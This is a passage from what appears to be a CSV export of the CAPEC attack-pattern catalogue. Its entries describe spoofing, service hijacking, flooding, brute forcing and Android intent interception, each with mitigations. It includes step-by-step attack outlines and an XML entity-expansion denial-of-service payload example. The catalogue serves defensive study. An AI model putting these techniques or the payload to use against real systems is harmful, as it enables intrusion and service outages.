required to create malformed data blobs and know how to insert them in a location that the recipient will visit.:LEVEL:High::\",\"\",\"\",\"\",\"::Ensure the application is using parsing and data display techniques that will accurately display control characters, international symbols and markings, and ultimately recognize potential homograph attacks.::\",\"\",\"::290::\",\"\",\"\",\n477,\"Signature Spoofing by Mixing Signed and Unsigned Content\",Detailed,Draft,\"An attacker exploits the underlying complexity of a data structure that allows for both signed and unsigned content, to cause unsigned data to be processed as though it were signed data.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:473::\",\"\",\"::Signer and recipient are using complex data storage structures that allow for a mix between signed and unsigned data::Recipient is using signature verification software that does not maintain separation between signed and unsigned data once the signature has been verified.::\",\"::SKILL:The attacker may need to continuously monitor a stream of signed data, waiting for an exploitable message to appear.:LEVEL:High::SKILL:Attacker must be able to create malformed data blobs and know how to insert them in a location that the recipient will visit.:LEVEL:High::\",\"\",\"\",\"\",\"::Ensure the application is fully patched and does not allow the processing of unsigned data as if it is signed data.::\",\"\",\"::693::311::319::\",\"\",\"\",\n478,\"Modification of Windows Service Configuration\",Detailed,Usable,\"An adversary exploits a weakness in access control to modify the execution parameters of a Windows service. The goal of this attack is to execute a malicious binary in place of an existing service.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:203::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target system] The adversary must first determine the system they wish to modify the registry of. This needs to be a windows machine as this attack only works on the windows registry.::STEP:2:PHASE:Experiment:DESCRIPTION:[Gain access to the system] The adversary needs to gain access to the system in some way so that they can modify the windows registry.:TECHNIQUE:Gain physical access to a system either through shoulder surfing a password or accessing a system that is left unlocked.:TECHNIQUE:Gain remote access to a system through a variety of means.::STEP:3:PHASE:Exploit:DESCRIPTION:[Modify windows registry] The adversary will modify the windows registry by changing the configuration settings for a service. Specifically, the adversary will change the path settings to define a path to a malicious binary to be executed.::\",\"::The adversary must have the capability to write to the Windows Registry on the targeted system.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:By altering specific configuration settings for the service, the adversary could run arbitrary code to be executed.::\",\"::Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.::\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.011:ENTRY NAME:Hijack Execution Flow:Service Registry Permissions Weakness::::TAXONOMY NAME:ATTACK:ENTRY ID:1543.003:ENTRY NAME:Create or Modify System Process:Windows Service::\",\"\",\n479,\"Malicious Root Certificate\",Detailed,Stable,\"An adversary exploits a weakness in authorization and installs a new root certificate on a compromised system. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:473::\",\"\",\"::The adversary must have the ability to create a new root certificate.::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1553.004:ENTRY NAME:Subvert Trust Controls:Install Root Certificate::\",\"\",\n48,\"Passing Local Filenames to Functions That Expect a URL\",Standard,Draft,\"This attack relies on client side code to access local files and resources instead of URLs. When the client browser is expecting a URL string, but instead receives a request for a local file, that execution is likely to occur in the browser process space with the browser's authority to local files. The attacker can send the results of this request to the local files out to a site that they control. This attack may be used to steal sensitive authentication data (either local or remote), or to gain system profile information to launch further attacks.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:212::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify web application URL inputs] Review application inputs to find those that are designed to be URLs.:TECHNIQUE:Manually navigate web site pages to identify URLs.:TECHNIQUE:Use automated tools to identify URLs.::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify URL inputs allowing local access.] Execute test local commands via each URL input to determine which are successful.:TECHNIQUE:Manually execute a local command (such as 'pwd') via the URL inputs.:TECHNIQUE:Using an automated tool, test each URL input for weakness.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute malicious commands] Using the identified URL inputs that allow local command execution, execute malicious commands.:TECHNIQUE:Execute local commands via the URL input.::\",\"::The victim's software must not differentiate between the location and type of reference passed the client software, e.g. browser::\",\"::SKILL:Attacker identifies known local files to exploit:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Ensure all configuration files and resource are either removed or protected when promoting code into production.::Design: Use browser technologies that do not allow client side scripting.::Implementation: Perform input validation for all remote content.::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::\",\"::J2EE applications frequently use .properties files to store configuration information including JDBC connections, LDAP connection strings, proxy information, system passwords and other system metadata that is valuable to attackers looking to probe the system or bypass policy enforcement points. When these files are stored in publicly accessible directories and are allowed to be read by the public user, then an attacker can list the directory identify a .properties file and simply load its contents in the browser listing its contents. A standard Hibernate properties file contains hibernate.connection.driver_class = org.postgresql.Driverhibernate.connection.url = jdbc:postgresql://localhost/mydatabasehibernate.connection.username = usernamehibernate.connection.password = passwordhibernate.c3p0.min_size=5hibernate.c3p0.max_size=20 Even if the attacker cannot write this file, there is plenty of information to leverage to gain further access.::\",\"::241::706::\",\"\",\"\",\n480,\"Escaping Virtualization\",Standard,Draft,\"An adversary gains access to an application, service, or device with the privileges of an authorized or privileged user by escaping the confines of a virtualized environment. The adversary is then able to access resources or execute unauthorized code within the host environment, generally with the privileges of the user running the virtualized process. Successfully executing an attack of this type is often the first step in executing more complex attacks.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:115::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Probing] The adversary probes the target application, service, or device to find a possible weakness that would allow escaping the virtualized environment.:TECHNIQUE:Probing applications, services, or devices for virtualization weaknesses.::STEP:2:PHASE:Experiment:DESCRIPTION:[Verify the exploitable security weaknesses] Using the found weakness, the adversary attempts to escape the virtualized environment.:TECHNIQUE:Using an application weakness to escape a virtualized environment::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute more complex attacks] Once outside of the virtualized environment, the adversary attempts to perform other more complex attacks such as accessing system resources or executing unauthorized code within the host environment.:TECHNIQUE:Executing complex attacks when given higher permissions by escaping a virtualized environment::\",\"\",\"\",\"\",\"\",\"::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::\",\"::Ensure virtualization software is current and up-to-date.::Abide by the least privilege principle to avoid assigning users more privileges than necessary.::\",\"\",\"::693::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1611:ENTRY NAME:Escape to Host::\",\"\",\n481,\"Contradictory Destinations in Traffic Routing Schemes\",Standard,Draft,\"Adversaries can provide contradictory destinations when sending messages. Traffic is routed in networks using the domain names in various headers available at different levels of the OSI model. In a Content Delivery Network (CDN) multiple domains might be available, and if there are contradictory domain names provided it is possible to route traffic to an inappropriate destination. The technique, called Domain Fronting, involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. An alternative technique, called Domainless Fronting, is similar, but the SNI field is left blank.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:161::\",\"\",\"::An adversary must be aware that their message will be routed using a CDN, and that both of the contradictory domains are served from that CDN.::If the purpose of the Domain Fronting is to hide redirected C2 traffic, the C2 server must have been created in the CDN.::\",\"::SKILL:The adversary must have some knowledge of how messages are routed.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data::\",\"::Monitor connections, checking headers in traffic for contradictory domain names, or empty domain names.::\",\"\",\"::923::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1090.004:ENTRY NAME:Proxy:Domain Fronting::\",\"\",\n482,\"TCP Flood\",Standard,Draft,\"An adversary may execute a flooding attack using the TCP protocol with the intent to deny legitimate users access to a service. These attacks exploit the weakness within the TCP protocol where there is some state information for the connection the server needs to maintain. This often involves the use of TCP SYN messages.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:125::\",\"\",\"::This type of an attack requires the ability to generate a large amount of TCP traffic to send to the target port of a functioning server.::\",\"\",\"\",\"\",\"\",\"::To mitigate this type of an attack, an organization can monitor incoming packets and look for patterns in the TCP traffic to determine if the network is under an attack. The potential target may implement a rate limit on TCP SYN messages which would provide limited capabilities while under attack.::\",\"\",\"::770::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service: Direct Network Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1499.001:ENTRY NAME:Endpoint Denial of Service: OS Exhaustion Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service: Service Exhaustion Flood::\",\"\",\n485,\"Signature Spoofing by Key Recreation\",Detailed,Draft,\"An attacker obtains an authoritative or reputable signer's private signature key by exploiting a cryptographic weakness in the signature algorithm or pseudorandom number generation and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:473::\",\"\",\"::An authoritative signer is using a weak method of random number generation or weak signing software that causes key leakage or permits key inference.::An authoritative signer is using a signature algorithm with a direct weakness or with poorly chosen parameters that enable the key to be recovered using signatures from that signer.::\",\"::SKILL:Cryptanalysis of signature generation algorithm:LEVEL:High::SKILL:Reverse engineering and cryptanalysis of signature generation algorithm implementation and random number generation:LEVEL:High::SKILL:Ability to create malformed data blobs and know how to present them directly or indirectly to a victim.:LEVEL:High::\",\"\",\"\",\"\",\"::Ensure cryptographic elements have been sufficiently tested for weaknesses.::\",\"\",\"::330::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1552.004:ENTRY NAME:Unsecure Credentials: Private Keys::\",\"\",\n486,\"UDP Flood\",Standard,Draft,\"An adversary may execute a flooding attack using the UDP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. Additionally, firewalls often open a port for each UDP connection destined for a service with an open UDP port, meaning the firewalls in essence save the connection state thus the high packet nature of a UDP flood can also overwhelm resources allocated to the firewall. UDP attacks can also target services like DNS or VoIP which utilize these protocols. Additionally, due to the session-less nature of the UDP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:125::\",\"\",\"::This type of an attack requires the ability to generate a large amount of UDP traffic to send to the desired port of a target service using UDP.::\",\"\",\"\",\"\",\"\",\"::To mitigate this type of an attack, modern firewalls drop UDP traffic destined for closed ports, and unsolicited UDP reply packets. A variety of other countermeasures such as universal reverse path forwarding and remote triggered black holing(RFC3704) along with modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.::\",\"\",\"::770::\",\"\",\"\",\n487,\"ICMP Flood\",Standard,Draft,\"An adversary may execute a flooding attack using the ICMP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. A typical attack involves a victim server receiving ICMP packets at a high rate from a wide range of source addresses. Additionally, due to the session-less nature of the ICMP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:125::\",\"\",\"::This type of an attack requires the ability to generate a large amount of ICMP traffic to send to the target server.::\",\"\",\"\",\"\",\"\",\"::To mitigate this type of an attack, an organization can enable ingress filtering. Additionally modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.::\",\"\",\"::770::\",\"\",\"\",\n488,\"HTTP Flood\",Standard,Draft,\"An adversary may execute a flooding attack using the HTTP protocol with the intent to deny legitimate users access to a service by consuming resources at the application layer such as web services and their infrastructure. These attacks use legitimate session-based HTTP GET requests designed to consume large amounts of a server's resources. Since these are legitimate sessions this attack is very difficult to detect.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:125::\",\"\",\"::This type of an attack requires the ability to generate a large amount of HTTP traffic to send to a target server.::\",\"\",\"\",\"\",\"\",\"::Design: Use a Web Application Firewall (WAF) to help filter out malicious traffic. This can be setup with rules to block IP addresses found in IP reputation databases, which contains lists of known bad IP addresses. Analysts should also monitor when the traffic flow becomes abnormally large, and be able to add on-the-fly rules to block malicious traffic. Special care should be taken to ensure low false positive rates in block rules and functionality should be implemented to allow a legitimate user to resume sending traffic if they have been blocked.::Hire a third party provider to implement a Web Application Firewall (WAF) for your application. Third party providers have dedicated resources and expertise that could allow them to update rules and prevent HTTP Floods very quickly.::Design: Use a load balancer such as nginx to prevent small scale HTTP Floods by dispersing traffic between a group of servers.::Implementation: Make a requesting machine solve some kind of challenge before allowing them to send an HTTP request. This could be a captcha or something similar that works to deter bots.::\",\"\",\"::770::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service:Service Exhaustion Flood::\",\"\",\n489,\"SSL Flood\",Standard,Draft,\"An adversary may execute a flooding attack using the SSL protocol with the intent to deny legitimate users access to a service by consuming all the available resources on the server side. These attacks take advantage of the asymmetric relationship between the processing power used by the client and the processing power used by the server to create a secure connection. In this manner the attacker can make a large number of HTTPS requests on a low provisioned machine to tie up a disproportionately large number of resources on the server. The clients then continue to keep renegotiating the SSL connection. When multiplied by a large number of attacking machines, this attack can result in a crash or loss of service to legitimate users.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:125::\",\"\",\"::This type of an attack requires the ability to generate a large amount of SSL traffic to send a target server.::\",\"\",\"\",\"\",\"\",\"::To mitigate this type of an attack, an organization can create rule based filters to silently drop connections if too many are attempted in a certain time period.::\",\"\",\"::770::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service:Service Exhaustion Flood::\",\"\",\n49,\"Password Brute Forcing\",Standard,Draft,\"An adversary tries every possible value for a password until they succeed. A brute force attack, if feasible computationally, will always be successful because it will essentially go through all possible passwords given the alphabet used (lower case letters, upper case letters, numbers, symbols, etc.) and the maximum length of the password.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:112::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine application's/system's password policy] Determine the password policies of the target application/system.:TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Exploit:DESCRIPTION:[Brute force password] Given the finite space of possible passwords dictated by the password policy determined in the previous step, try all possible passwords for a known user ID until application/system grants access.:TECHNIQUE:Manually or automatically enter all possible passwords through the application/system's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.:TECHNIQUE:Perform an offline dictionary attack or a rainbow table attack against a known password hash.::\",\"::An adversary needs to know a username to target.::The system uses password based authentication as the one factor authentication mechanism.::An application does not have a password throttling mechanism in place. A good password throttling mechanism will make it almost impossible computationally to brute force a password as it may either lock out the user after a certain number of incorrect attempts or introduce time out periods. Both of these would make a brute force attack impractical.::\",\"::SKILL:A brute force attack is very straightforward. A variety of password cracking tools are widely available.:LEVEL:Low::\",\"::A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).::\",\"::Many incorrect login attempts are detected by the system.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.::Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.::Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen.::\",\"::A system does not enforce a strong password policy and the user picks a five letter password consisting of lower case English letters only. The system does not implement any password throttling mechanism. Assuming the adversary does not know the length of the users' password, an adversary can brute force this password in maximum 1+26+26^2+26^3+26^4+26^5 = 1 + 26 + 676 + 17576 + 456976 + 11,881,376 = 12,356,631 attempts, and half these tries (6,178,316) on average. Using modern hardware this attack is trivial. If the adversary were to assume that the user password could also contain upper case letters (and it was case sensitive) and/or numbers, than the number of trials would have been larger. An adversary's job would have most likely been even easier because many users who choose easy to brute force passwords like this are also likely to use a word that can be found in the dictionary. Since there are far fewer valid English words containing up to five letters than 12,356,631, an attack that tries each of the entries in the English dictionary would go even faster.::A weakness exists in the automatic password generation routine of Mailman prior to 2.1.5 that causes only about five million different passwords to be generated. This makes it easy to brute force the password for all users who decided to let Mailman automatically generate their passwords for them. Users who chose their own passwords during the sign up process would not have been affected (assuming that they chose strong passwords). See also: CVE-2004-1143::\",\"::521::262::263::257::654::307::308::309::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1110.001:ENTRY NAME:Brute Force:Password Guessing::\",\"\",\n490,\"Amplification\",Standard,Draft,\"An adversary may execute an amplification where the size of a response is far greater than that of the request that generates it. The goal of this attack is to use a relatively few resources to create a large amount of traffic against a target server. To execute this attack, an adversary send a request to a 3rd party service, spoofing the source address to be that of the target server. The larger response that is generated by the 3rd party service is then sent to the target server. By sending a large number of initial requests, the adversary can generate a tremendous amount of traffic directed at the target. The greater the discrepancy in size between the initial request and the final payload delivered to the target increased the effectiveness of this attack.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:125::\",\"\",\"::This type of an attack requires the existence of a 3rd party service that generates a response that is significantly larger than the request that triggers it.::\",\"\",\"\",\"\",\"\",\"::To mitigate this type of an attack, an organization can attempt to identify the 3rd party services being used in an active attack and blocking them until the attack ends. This can be accomplished by filtering traffic for suspicious message patterns such as a spike in traffic where each response contains the same large block of data. Care should be taken to prevent false positive rates so legitimate traffic isn't blocked.::\",\"\",\"::770::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1498.002:ENTRY NAME:Network Denial of Service:Reflection Amplification::\",\"\",\n491,\"Quadratic Data Expansion\",Detailed,Draft,\"An adversary exploits macro-like substitution to cause a denial of service situation due to excessive memory being allocated to fully expand the data. The result of this denial of service could cause the application to freeze or crash. This involves defining a very large entity and using it multiple times in a single entity substitution. CAPEC-197 is a similar attack pattern, but it is easier to discover and defend against. This attack pattern does not perform multi-level substitution and therefore does not obviously appear to consume extensive resources.\",\"::TERM:XML Entity Expansion (XEE):DESCRIPTION:::\",,,\"::NATURE:ChildOf:CAPEC ID:230::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] An adversary determines the input data stream that is being processed by a data parser that supports using substituion on the victim's side.:TECHNIQUE:Use an automated tool to record all instances of URLs to process requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes requests.::STEP:2:PHASE:Exploit:DESCRIPTION:[Craft malicious payload] The adversary crafts malicious message containing nested quadratic expansion that completely uses up available server resource.::STEP:3:PHASE:Exploit:DESCRIPTION:[Send the message] Send the malicious crafted message to the target URL.::\",\"::This type of attack requires a server that accepts serialization data which supports substitution and parses the data.::\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::\",\"::Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.::Implementation: For XML based data - disable altogether the use of inline DTD schemas when parsing XML objects. If a DTD must be used, normalize, filter and use an allowlist and parse with methods and routines that will detect entity expansion from untrusted sources.::\",\"::In this example the attacker defines one large entity and refers to it many times. <?xml version=1.0?><!DOCTYPE bomb [<!ENTITY x AAAAA... [100K of them] ...AAAA>]><b><c>&x;&x;... [100K of them]...&x;&x;</c></b> This results in a relatively small message of 100KBs that will expand to a message in the GB range.::\",\"::770::\",\"\",\"\",\n492,\"Regular Expression Exponential Blowup\",Standard,Draft,\"An adversary may execute an attack on a program that uses a poor Regular Expression(Regex) implementation by choosing input that results in an extreme situation for the Regex. A typical extreme situation operates at exponential time compared to the input size. This is due to most implementations using a Nondeterministic Finite Automaton(NFA) state machine to be built by the Regex algorithm since NFA allows backtracking and thus more complex regular expressions.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:130::\",\"\",\"::This type of an attack requires the ability to identify hosts running a poorly implemented Regex, and the ability to send crafted input to exploit the regular expression.::\",\"\",\"\",\"\",\"\",\"::Test custom written Regex with fuzzing to determine if the Regex is a poor one. Add timeouts to processes that handle the Regex logic. If an evil Regex is found rewrite it as a good Regex.::\",\"\",\"::400::1333::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Regular expression Denial of Service - ReDoS::\",\"\",\n493,\"SOAP Array Blowup\",Standard,Draft,\"An adversary may execute an attack on a web service that uses SOAP messages in communication. By sending a very large SOAP array declaration to the web service, the attacker forces the web service to allocate space for the array elements before they are parsed by the XML parser. The attacker message is typically small in size containing a large array declaration of say 1,000,000 elements and a couple of array elements. This attack targets exhaustion of the memory resources of the web service.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:130::\",\"\",\"::This type of an attack requires the attacker to know the endpoint of the web service, and be able to reach the endpoint with a malicious SOAP message.::\",\"\",\"\",\"\",\"\",\"::Enforce strict schema validation. The schema should enforce a maximum number of array elements. If the number of maximum array elements can't be limited another validation method should be used. One such method could be comparing the declared number of items in the array with the existing number of elements of the array. If these numbers don't match drop the SOAP packet at the web service layer.::\",\"\",\"::770::\",\"\",\"\",\n494,\"TCP Fragmentation\",Standard,Draft,\"An adversary may execute a TCP Fragmentation attack against a target with the intention of avoiding filtering rules of network controls, by attempting to fragment the TCP packet such that the headers flag field is pushed into the second fragment which typically is not filtered.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:130::\",\"\",\"::This type of an attack requires the target system to be running a vulnerable implementation of IP, and the adversary needs to ability to send TCP packets of arbitrary size with crafted data.::\",\"\",\"\",\"\",\"\",\"::This attack may be mitigated by enforcing rules at the router following the guidance of RFC1858. The essential part of the guidance is creating the following rule IF FO=1 and PROTOCOL=TCP then DROP PACKET as this mitigated both tiny fragment and overlapping fragment attacks in IPv4. In IPv6 overlapping(RFC5722) additional steps may be required such as deep packet inspection. The delayed fragments may be mitigated by enforcing a timeout on the transmission to receive all packets by a certain time since the first packet is received. According to RFC2460 IPv6 implementations should enforce a rule to discard all fragments if the fragments are not ALL received within 60 seconds of the FIRST arriving fragment.::\",\"\",\"::770::404::\",\"\",\"\",\n495,\"UDP Fragmentation\",Standard,Draft,\"An attacker may execute a UDP Fragmentation attack against a target server in an attempt to consume resources such as bandwidth and CPU. IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. Typically the attacker will use large UDP packets over 1500 bytes of data which forces fragmentation as ethernet MTU is 1500 bytes. This attack is a variation on a typical UDP flood but it enables more network bandwidth to be consumed with fewer packets. Additionally it has the potential to consume server CPU resources and fill memory buffers associated with the processing and reassembling of fragmented packets.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:130::\",\"\",\"::This type of an attack requires the attacker to be able to generate fragmented IP traffic containing crafted data.::\",\"\",\"\",\"\",\"\",\"::This attack may be mitigated by changing default cache sizes to be larger at the OS level. Additionally rules can be enforced to prune the cache with shorter timeouts for packet reassembly as the cache nears capacity.::\",\"\",\"::770::404::\",\"\",\"\",\n496,\"ICMP Fragmentation\",Standard,Draft,\"An attacker may execute a ICMP Fragmentation attack against a target with the intention of consuming resources or causing a crash. The attacker crafts a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message. The attacker these sends these messages to a target host which causes the host to become non-responsive. Another vector may be sending a fragmented ICMP message to a target host with incorrect sizes in the header which causes the host to hang.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:130::\",\"\",\"::This type of an attack requires the target system to be running a vulnerable implementation of IP, and the attacker needs to ability to send arbitrary sized ICMP packets to the target.::\",\"\",\"\",\"\",\"\",\"::This attack may be mitigated through egress filtering based on ICMP payload so a network is a good neighbor to other networks. Bad IP implementations become patched, so using the proper version of a browser or OS is recommended.::\",\"\",\"::770::404::\",\"\",\"\",\n497,\"File Discovery\",Standard,Draft,\"An adversary engages in probing and exploration activities to determine if common key files exists. Such files often contain configuration and security parameters of the targeted application, system or network. Using this knowledge may often pave the way for more damaging attacks.\",\"\",High,Very Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must know the location of these common key files.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Leverage file protection mechanisms to render these files accessible only to authorized parties.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1083:ENTRY NAME:File and Directory Discovery::\",\"\",\n498,\"Probe iOS Screenshots\",Detailed,Draft,\"An adversary examines screenshot images created by iOS in an attempt to obtain sensitive information. This attack targets temporary screenshots created by the underlying OS while the application remains open in the background.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:545::\",\"\",\"::This type of an attack requires physical access to a device to either excavate the image files (potentially by leveraging a Jailbreak) or view the screenshots through the multitasking switcher (by double tapping the home button on the device).::\",\"\",\"\",\"\",\"\",\"::To mitigate this type of an attack, an application that may display sensitive information should clear the screen contents before a screenshot is taken. This can be accomplished by setting the key window's hidden property to YES. This code to hide the contents should be placed in both the applicationWillResignActive() and applicationDidEnterBackground() methods.::\",\"\",\"::359::\",\"\",\"\",\n499,\"Android Intent Intercept\",Standard,Draft,\"An adversary, through a previously installed malicious application, intercepts messages from a trusted Android-based application in an attempt to achieve a variety of different objectives including denial of service, information disclosure, and data injection. An implicit intent sent from a trusted application can be received by any application that has declared an appropriate intent filter. If the intent is not protected by a permission that the malicious application lacks, then the attacker can gain access to the data contained within the intent. Further, the intent can be either blocked from reaching the intended destination, or modified and potentially forwarded along.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:117::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find an android application that uses implicit intents] Since this attack only works on android applications that use implicit intents, rather than explicit intents, an adversary must first identify an app that uses implicit intents. They must also determine what the contents of the intents being sent are such that a malicious application can get sent these intents.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create a malicious app] The adversary must create a malicious android app meant to intercept implicit intents from a target application:TECHNIQUE:Specify the type of intent wished to be intercepted in the malicious app's manifest file using an intent filter::STEP:3:PHASE:Experiment:DESCRIPTION:[Get user to download malicious app] The adversary must get a user using the targeted app to download the malicious app by any means necessary::STEP:4:PHASE:Exploit:DESCRIPTION:[Intercept Implicit Intents] Once the malicious app is downloaded, the android device will forward any implicit intents from the target application to the malicious application, allowing the adversary to gaina access to the contents of the intent. The adversary can proceed with any attack using the contents of the intent.:TECHNIQUE:Block the intent from reaching the desired location, causing a denial of service:TECHNIQUE:Gather sensitive information from the intercepted intent:TECHNIQUE:Modify the contents of the intent and forward along to another application::\",\"::An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application is used to intercept implicit intents.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::\",\"::To mitigate this type of an attack, explicit intents should be used whenever sensitive data is being sent. An explicit intent is delivered to a specific application as declared within the intent, whereas the Android operating system determines who receives an implicit intent which could potentially be a malicious application. If an implicit intent must be used, then it should be assumed that the intent will be received by an unknown application and any response should be treated accordingly. Implicit intents should never be used for inter-application communication.::\",\"\",\"::925::\",\"\",\"\",\n5,\"Blue Boxing\",Detailed,Obsolete,\"This type of attack against older telephone switches and trunks has been around for decades. A tone is sent by an adversary to impersonate a supervisor signal which has the effect of rerouting or usurping command of the line. While the US infrastructure proper may not contain widespread vulnerabilities to this type of attack, many companies are connected globally through call centers and business process outsourcing. These international systems may be operated in countries which have not upgraded Telco infrastructure and so are vulnerable to Blue boxing. Blue boxing is a result of failure on the part of the system to enforce strong authorization for administrative functions. While the infrastructure is different than standard current applications like web applications, there are historical lessons to be learned to upgrade the access control for administrative functions. This attack pattern is included in CAPEC for historical purposes.\",\"\",Medium,Very High,\"::NATURE:ChildOf:CAPEC ID:220::\",\"\",\"::System must use weak authentication mechanisms for administrative functions.::\",\"::SKILL:Given a vulnerable phone system, the attackers' technical vector relies on attacks that are well documented in cracker 'zines and have been around for decades.:LEVEL:Low::\",\"::CCITT-5 or other vulnerable lines, with the ability to send tones such as combined 2,400 Hz and 2,600 Hz tones to the switch::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Implementation: Upgrade phone lines. Note this may be prohibitively expensive::Use strong access control such as two factor access control for administrative access to the switch::\",\"::An adversary identifies a vulnerable CCITT-5 phone line, and sends a combination tone to the switch in order to request administrative access. Based on tone and timing parameters the request is verified for access to the switch. Once the adversary has gained control of the switch launching calls, routing calls, and a whole host of opportunities are 